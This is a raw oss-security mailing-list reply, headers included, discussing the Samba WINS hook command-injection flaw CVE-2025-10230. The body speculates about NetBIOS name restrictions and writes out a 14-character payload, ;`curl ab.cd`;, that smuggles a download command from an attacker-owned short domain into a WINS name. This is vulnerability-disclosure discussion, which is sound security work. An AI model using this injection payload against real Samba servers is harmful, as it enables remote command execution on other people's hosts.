Received: (qmail 20357 invoked by uid 550); 15 Oct 2025 23:38:52 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
x-ms-reactions: disallow
Received: (qmail 3356 invoked from network); 15 Oct 2025 23:31:02 -0000
ARC-Seal: i=1; a=rsa-sha256; s=arcselector10001; d=microsoft.com; cv=none;
 b=kyr2620s5s37V2uKA16C8/3zIGdzRL7u2tP/v7hrevBYM42EttaxrhlwlHNjru/cSjWLbmS5QFt9IRQYiOI6Z01XFUYpEoQuj1tTxwIh6v/G6Dr5WU4RDt74EdQxAdUP1Tl2BFM0QDsihCjYpzMcn/UXuESyG4M/xC/Ipym0zMU2FJfgQ3v3RgxclsHTikJdfvqbVltnXpsdyHd2y84/Axawu4mdtGLDQdKW2iKQNF3rkUXatQt1Jbq0vGge1Fr82VuhJ/btpVcKpVvqdiNyDruXhTlCEGL+YD/1bStcA9idfbjykE9wUTiUU0Vcb96kKPCVocbv0W/xVNJtgHgtng==
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=microsoft.com;
 s=arcselector10001;
 h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-AntiSpam-MessageData-ChunkCount:X-MS-Exchange-AntiSpam-MessageData-0:X-MS-Exchange-AntiSpam-MessageData-1;
 bh=WxbMoAHshwCSpPYBOQHHwDGtFDwM1becLbKbe1Zdzsw=;
 b=ig3XtpDPnXgcqjrMZKGnGdWNnBztSci9VHo9mtS3JVUBgAHr6T8yadLVnrSFkGlzmWUQGwxXr3dYIDgaleAqpmKE1Y1wgUVle4DIesacD4dd+XiYDoXnqP168pFjnzKbw48YQPpHicsacMvCB/cX85Iq/p79R5QITDGLhtoI/VQ2a8mAz0VHaqNMbhShKjs3CBWQTnheF3VXHlpmnbrHjFWlc/Wix3lDqU4dipa4Pq/QaXH9f+cfktjlTScBRLyp9qrzbtmEPMrtST6hx+/kOVHk7M5OkQxTAynKSq2/GhAaZizVm89YF0feeYf10eVgdwvEdvKvFz4stv/Sf22VWA==
ARC-Authentication-Results: i=1; mx.microsoft.com 1; spf=pass
 smtp.mailfrom=seattleschools.org; dmarc=pass action=none
 header.from=seattleschools.org; dkim=pass header.d=seattleschools.org;
 arc=none
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=seattleschools.org;
 s=selector1;
 h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-SenderADCheck;
 bh=WxbMoAHshwCSpPYBOQHHwDGtFDwM1becLbKbe1Zdzsw=;
 b=ujGIg8F4fHiXcnUbzgrxXA+sZziSUWGEh88v+V17T3Lkg6ZoGCTa7eKh07nj01nXWE2Rpt2Jc+oCkg5bQu5DJsvzRW7fCJnYtVDj7CgxujxC/TdlRK6miZkv2Sd97Jy7YaWX9f8I5gAHYqkGctsLZ0ORYVjNW+UqEwPMGoECi9cGQ8Zz50m/6Bu7L+/+0tucAFQiDNI8YSdbJ4kwW9/DzSPn2FMHVWqTAOcYcs/J0gySsJJCkULG7hTZNYCEFQARcPkalNwCT3h5x2dWiUcZ4HN9nV2JXz/90WI4IWjEEyaau33lm03w2FBJIctE9Uaa5mDhzMgGnWU+U3bTY0oc/w==
From: "Caveney, Seamus G" <sgcaveney@seattleschools.org>
To: "oss-security@lists.openwall.com" <oss-security@lists.openwall.com>
Thread-Topic: [oss-security] Samba security releases for CVE-2025-10230 and
 CVE-2025-9640
Thread-Index: AQHcPgY5j50lRg3Co0mGTu+U/7pHa7TDlg+A
Date: Wed, 15 Oct 2025 23:30:49 +0000
Message-ID:
 <DS1PR04MB965568BE9229892AA593E6E8C0E8A@DS1PR04MB9655.namprd04.prod.outlook.com>
References: <20f5f042-d3de-411b-aa09-b2c46ee19cc8@samba.org>
 <da7aa05f-01c0-4798-8496-33f1c0010e4e@catalyst.net.nz>
 <2338e6b3-44d5-4d9e-bd94-e3b96534359d@catalyst.net.nz>
In-Reply-To: <2338e6b3-44d5-4d9e-bd94-e3b96534359d@catalyst.net.nz>
Accept-Language: en-US
Content-Language: en-US
X-MS-Has-Attach:
X-MS-TNEF-Correlator:
authentication-results: dkim=none (message not signed)
 header.d=none;dmarc=none action=none header.from=seattleschools.org;
x-ms-publictraffictype: Email
x-ms-traffictypediagnostic: DS1PR04MB9655:EE_|LV8PR04MB9242:EE_
x-ms-office365-filtering-correlation-id: 68c186b7-c776-4202-9441-08de0c42dfd8
x-ms-exchange-senderadcheck: 1
x-ms-exchange-antispam-relay: 0
x-microsoft-antispam:
 BCL:0;ARA:13230040|376014|366016|1800799024|38070700021|7053199007;
x-microsoft-antispam-message-info:
 =?us-ascii?Q?dZJAP/SZ64PjQjkNOaACymK2gU/FYofh+wHTB276dKOAPV2IzIifGE9jTPFx?=
 =?us-ascii?Q?RBzjdA1E4CQ+8XYB2/r0uUNsiLpdKMqT8TIMO+9VFAq8dVQbLdgjmoQACs7F?=
 =?us-ascii?Q?95BajJ9AxU/QPKE2MUEQywbbVbqt7bGtuChpnG9146OehKg1c9FhyLcNro/q?=
 =?us-ascii?Q?RpsQsWY9wXOs5QOmWb4ZoyCs0N4gmvYi57nt2IMmJ8hrBUhjatRuktAG69J8?=
 =?us-ascii?Q?T1uYTxhcQdC/KB7jbBHfOs5bHyht4+aelStGOaqKplMSd9vLvPbS9HLjz4II?=
 =?us-ascii?Q?Y5mOAODYvqv3+cjh29GiHMkcXOL2HBIfCJ3HYqXBFMtm3haq+fr/NZFrJ0Ip?=
 =?us-ascii?Q?ce03CYKianVfp5nGwY8DatYViIPQzIOZ4a37nkafucCWtnHvjYDJXa0LQCKu?=
 =?us-ascii?Q?WKA9/KdErca5x2YWHBcZPWAfh2wM56n1jXO9r+han4KlrH3RECF3jWLHUBl+?=
 =?us-ascii?Q?RV0/4T1KuVXWPbCKm73g0aBkWs0XhrKN79gNXZLg0L4zflf/ocdKilj0EgMQ?=
 =?us-ascii?Q?qtcMWRmYkvVDGZOZJdDTqvfX+h3MGY3onRpLicsySByclD2PvhEqoOaKbtba?=
 =?us-ascii?Q?xqm1xJW45iJIHUy+AU/5moc/nS9s2MyvThidhU3Mu2ha0+F59T4WRtoNyiZb?=
 =?us-ascii?Q?Iv23PKxcPWdQ9xjkL1ijzKSlHxTxMNyY65y87UZw7uPg4dGhy5R5rBtwUqvn?=
 =?us-ascii?Q?5SPFAV+iAIWF8mc1JWs5x7Pz9YVX6bMoFRekJP7733eQRf4eKVRmGi8KCGla?=
 =?us-ascii?Q?r6QqBA/pTlElktryEjjrFAZeKK2Sbi9GQ5fXe10ERbwSaK85FX3ni2SzAXPG?=
 =?us-ascii?Q?d857wq8477PhcYhVYqJPv0fJwW0F3mTrGNfabPSm75fCHKoAgvQgzbPi3W1h?=
 =?us-ascii?Q?4qnEAU2d+5awTC5f25fSsR4pWxszo8SUvBcTDG8qM7htVPbblpQiziEtqyn8?=
 =?us-ascii?Q?p73MtaXB7WKKHXLjEWOLDz9dYMRlVpqrljEnh2YkgnrtHAXXF0xUIZKyHH+0?=
 =?us-ascii?Q?cQsj605dtbfN8lmtevE9+8r2kf+ESuQACsfbmTYtOCYPR2pi4DIjYnPv4qCg?=
 =?us-ascii?Q?KnmmQytO6gNtMDZQEc1R3Y9JFhP4Nnkpe/IYnaQDtNpv1udeUxgFwfB4J2dO?=
 =?us-ascii?Q?cXjj+rq/fRkHOTgxHxjTWmn4xvSL2oMb3LrIi1lrSSkjcDcRU23tvT6TArAb?=
 =?us-ascii?Q?od+JUJR+pARmHiF9l4rf7kj3rJfXYbN25FAvbfAZS6Rd51oMbqDjgBuIgwgq?=
 =?us-ascii?Q?fjGpx0O8sM6qq+cCj5zu8yq2KVlmkWlddEpEVRq/QbMQCmGY5UHAF4YXduCJ?=
 =?us-ascii?Q?QmftSyxh5wUbTw/M5kQxulOdGvocX2J2NLqEOKCU3JkIo8qGVm9fdUuTDKWd?=
 =?us-ascii?Q?4IKu577YBjzGxcVlsEsPlRAGWOrikROI5fcLY6IGpmzQkzASCLAOuN/vzvkx?=
 =?us-ascii?Q?TIl3w0xcCagWdzVd4aqNmrIzelwG+dDEjA/ZNfynOCXM69AURgl6x2B26YpL?=
 =?us-ascii?Q?DkRuNZCc1GtcZQtSFYNLvirl/q6Hi3off5Ns?=
x-forefront-antispam-report:
 CIP:255.255.255.255;CTRY:;LANG:en;SCL:1;SRV:;IPV:NLI;SFV:NSPM;H:DS1PR04MB9655.namprd04.prod.outlook.com;PTR:;CAT:NONE;SFS:(13230040)(376014)(366016)(1800799024)(38070700021)(7053199007);DIR:OUT;SFP:1102;
x-ms-exchange-antispam-messagedata-chunkcount: 1
x-ms-exchange-antispam-messagedata-0:
 =?us-ascii?Q?L86LuNixpWd0sFm22+burfhzTbvh3F7El3PBSNQavbTK7AotqtUybOqolfZ1?=
 =?us-ascii?Q?08cb1fUDQSMJv6/nVbMQmmfhCbLm8sKUtGRpvlwZabrbL4i+bkBASvl3dTmy?=
 =?us-ascii?Q?REgTC3TICLh7ZNpgQ6B/bbMNopAWNmao2y1z0VJ2yemzPsbnXqhstdMXEDxE?=
 =?us-ascii?Q?92Tn9q5jNRk1m13GoU6PxTRoqzCRHAThtOI420ICSg3+VDnKXBW3KFmVuu9c?=
 =?us-ascii?Q?BsK7NdA+zPHv61+D8lf+7icB9JI9ayWZwEHvJxPUiVdGmD34l9aLtYDC6+EV?=
 =?us-ascii?Q?6GxUPjMZ/s8S/cIUa/Dns5jtIOsu/oAyNiGjf/+0+mJ36K4Rjxqu+InVSMLJ?=
 =?us-ascii?Q?kSZKd/iicIYZOmru7YJUaOA5sMLMqcU2X9JVd/yvlIdNfXCmaVqCv6lDAAZ8?=
 =?us-ascii?Q?XwySzOAeM8TQW4aiWXu3nWoTvhLAH2as4Vw8huuqnTok8EtXRxirFgUgUgvI?=
 =?us-ascii?Q?MCZD3gzKA6rExVsQqW1jmnKq7gO4aOvhU6hpt7uD2vkrNhj81qPKHzPFwO5g?=
 =?us-ascii?Q?ZAJS9y7FlaGi7pMITlpD1vwOoPoDc4LoXWLa+u3HdG5aewit1EAr0CV1bpS2?=
 =?us-ascii?Q?nsWK2746XjXQY3F8wf3h+4utcjJcazAOHr8UEDdGUzd4E5GHGYewYHwTizU5?=
 =?us-ascii?Q?fkYKi7bPeDy0H1HhA0xsamdNkvo4vwFonIfoVdZdc7FD5ejZ117J9zf82DMd?=
 =?us-ascii?Q?Q7X6pFSXSG558i1jHlHFQNYbuovAzbXgewrOXcCnlr/dTVvoszvmglbyuMpg?=
 =?us-ascii?Q?liKZe/00B4bRVZlu2w8CPPOsgH7mnB2DGF6ivqyCdamHEQ/Mc5yFSDBemOMp?=
 =?us-ascii?Q?CYgJJG4yyhN5PJuVGPIkvzjDu4rTJDJ3op2BJjCrHYiGxENgP1Cf59a6qoW8?=
 =?us-ascii?Q?sBNkdvbicdotTJk07d0eA1uaDwBUo6VMgGfCrP87XJe5nVdHy8tZt7GY+UOS?=
 =?us-ascii?Q?JTh/3e9fHf/Ahj4tXDh8k5uHfJCYYp9b5jnGj5QqDO/rWzVKq0Li0tTmenvI?=
 =?us-ascii?Q?X2fNWzRt5YqF2efRWOJR8fOSI2qSPoGbfkA5j/W8xEXLWkmvGz2TccC94kpB?=
 =?us-ascii?Q?34JwWOWQvmqtXOvKXbzEnhf5X4OsK8aTukjnVRm/Uf4Wi61JdsLq+0wjD5GW?=
 =?us-ascii?Q?kGPTzf81pH0RKkbOzg2iazGxril4KoLyEO7vTt5xr+53UoJ7KOot++6Q5rXM?=
 =?us-ascii?Q?ybFLOIsTg5lGhnnpKMKKU1amn00MJ/0YTEhCFyQCdUSbTuq7Jr/OFsldCNI8?=
 =?us-ascii?Q?mAl84fkSeJaH1su3TJO8K1vMjfwKbds+5kcX7qNbssZbQTg/KkhcO8yW4jBU?=
 =?us-ascii?Q?hQs9hpYoEX37VI/mxZB0sSxjmZYE9krOkHnQ0TMOE7nnDfrUcbeT2sA7Oi32?=
 =?us-ascii?Q?a/lvcLUWZijeThEQa04+GH1v5e4wQWypp5EhhrxSyfD8rcK8YD0RD/hleaWy?=
 =?us-ascii?Q?IijWM3cX0VTXrZ2ij4hFuXb/tg24+koBWKex9Y0YYoMGwp+l5mPUsk0atoTk?=
 =?us-ascii?Q?QKfLebd61jLeOmUPZLxP6jLlmYjlqxgXPE4dqO6qsq7BLTaKsl6Lh46IWHiB?=
 =?us-ascii?Q?XPyzD+PrkCNGG/CYI8FBXVXOYdM3AqnwTBlufBef6klmevqU4wBU3unEyBNU?=
 =?us-ascii?Q?Ww=3D=3D?=
Content-Type: text/plain; charset="us-ascii"
Content-Transfer-Encoding: quoted-printable
MIME-Version: 1.0
X-OriginatorOrg: seattleschools.org
X-MS-Exchange-CrossTenant-AuthAs: Internal
X-MS-Exchange-CrossTenant-AuthSource: DS1PR04MB9655.namprd04.prod.outlook.com
X-MS-Exchange-CrossTenant-Network-Message-Id: 68c186b7-c776-4202-9441-08de0c42dfd8
X-MS-Exchange-CrossTenant-originalarrivaltime: 15 Oct 2025 23:30:49.5580
 (UTC)
X-MS-Exchange-CrossTenant-fromentityheader: Hosted
X-MS-Exchange-CrossTenant-id: d431d158-6074-4832-8783-51ea6f6dd227
X-MS-Exchange-CrossTenant-mailboxtype: HOSTED
X-MS-Exchange-CrossTenant-userprincipalname: lQEQs593QIgsh4fTCDm4xVWuvZo+PyK3ndMx+LINT2BIcEfxpEdz+d2VaaLLFZ0FEURjrwB23sq5Hr6AuUGomvuquzJi/b4b5sBSpILBuGw=
X-MS-Exchange-Transport-CrossTenantHeadersStamped: LV8PR04MB9242
Subject: RE: [oss-security] Samba security releases for CVE-2025-10230 and
 CVE-2025-9640

-----Original Message-----
From: Douglas Bagnall <douglas.bagnall@catalyst.net.nz>=20
Sent: Wednesday, October 15, 2025 11:51 AM
To: oss-security@lists.openwall.com
Subject: [oss-security] Samba security releases for CVE-2025-10230 and CVE-=
2025-9640

> [snip]

> If a Samba server has WINS support enabled (it is off by default), and it=
 has a 'wins hook' parameter specified, the
> program specified by that parameter will be run whenever a WINS name is c=
hanged.
> The WINS server used by the Samba Active Directory Domain Controller did =
not validate the names passed to the wins
> hook program, and it passed them by inserting them into a string run by a=
 shell.
> WINS is an obsolete and trusting protocol, and clients can request any na=
me that fits within the 15 character NetBIOS
> limit. This includes some shell metacharacters, making it possible to run=
 arbitrary commands on the host.
> The WINS server used by Samba when it is not a domain controller is unaff=
ected.

Illegal characters in a NetBIOS hostname are:

\ / : * ? " < > | ,

notably excluding backticks and semicolons. I'm not deeply familiar with th=
e Samba code base but a glance at nbtname.c
and winsserver.c seems to suggest that those character limitations aren't e=
nforced at the protocol level, so it might be
possible to use pipes, redirects or exec a local binary with a short path. =
Otherwise, the easiest exploitable payload I
can think of would be:

;`curl ab.cd`;

which fits the restrictions at only 14 characters (replace with your favour=
ite short-named download tool that writes to
STDOUT by default - looks like RHEL-likes are one of the few distros still =
shipping /usr/bin/GET as part of perl LWP).
Requiring an attacker to own a 2-3 letter domain on a 2-3 letter TLD limits=
 the attack surface quite a bit but it isn't
unheard of. I'd be interested to see if anybody has a living Samba install =
configured as a DC with WINS still running in
2025.
